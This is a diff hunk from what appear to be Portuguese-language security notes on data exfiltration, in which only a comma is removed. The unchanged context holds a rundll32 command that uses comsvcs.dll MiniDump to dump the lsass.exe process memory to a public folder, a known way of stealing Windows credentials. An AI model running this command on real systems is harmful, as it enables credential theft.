@@ -72,7 +72,7 @@ lsass.exe                      688 Services                   0     19,788 K
 
 * data exfiltration
 
-function MiniDump do comsvcs.dll, para realizar uma cópia do lsass.exe -->
+function MiniDump do comsvcs.dll para realizar uma cópia do lsass.exe -->
 #+begin_src powershell
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Public\lsass.dmp full
 #+end_src
